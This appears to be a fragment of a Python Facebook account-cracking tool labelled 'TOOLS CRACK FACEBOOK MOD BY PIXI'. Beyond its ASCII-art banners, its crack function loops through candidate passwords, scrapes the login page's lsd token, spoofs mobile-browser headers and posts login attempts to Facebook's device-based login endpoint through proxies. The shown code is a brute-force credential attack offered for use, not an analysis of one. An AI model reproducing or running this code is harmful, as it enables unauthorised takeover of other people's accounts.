...
{P}     \__\/                   |__|/                
╠────────────────────────────────────────────────────────────────╣
  		{M}•{K}•{H}• {P}TOOLS CRACK FACEBOOK MOD BY PIXI {H}•{K}•{M}• {P}""")
def logo2():
	return str(f"""
╠───────────────────────────────────────────────────────────╣
{M}      ___                     ___                 {P} 	
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			link = ses.get(f"https://{url}/login/?next=https%3A%2F%2F%7Burl%7D%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&ref=dbl&fl&login_from_aymh=1&refid=9").text
			...
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?next=https%3A%2F%2F%7Burl%7D%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&ref=dbl&fl&login_from_aymh=1&refid=9", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bx = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=https%3A%2F%2F{url}%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=date, headers=head,proxies=proxy)
